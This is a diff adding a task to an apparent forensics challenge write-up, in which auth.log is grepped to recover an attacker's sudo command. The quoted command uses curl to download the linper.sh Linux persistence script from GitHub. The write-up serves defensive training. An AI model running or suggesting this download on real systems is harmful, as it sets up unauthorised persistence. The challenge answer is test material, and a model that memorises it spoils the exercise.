@@ -176,4 +176,38 @@ Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Wait
 ```
 
 >Here, we can see that SSH session 37 was closed at 6:37:24, so ***2024-03-06 06:37:24***
+
 ---
+
+### Task 8
+**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
+
+To find the command, let's use the `grep` command:
+
+```bash
+grep "sudo" auth.log
+```
+In the output, there is a line which is:
+
+```bash
+Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+```
+>From here, we got the command: ***/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh***
+
+---
+
+<br>
+
+### Also, See Other Write-ups and Notes in My Repo
+
+Feel free to explore other detailed write-ups and notes I've compiled in my repository. You can find more information on various cybersecurity topics and challenges, as well as the solutions and methodologies used for each task.
+
+
+
+🌐 [Visit My GitHub Repository](https://github.com/TheSabari07/Cybersecurity-Study-Notes.git)
+
+🔒 Stay updated with the latest cybersecurity trends, tools, and techniques!
+
+---
+
+
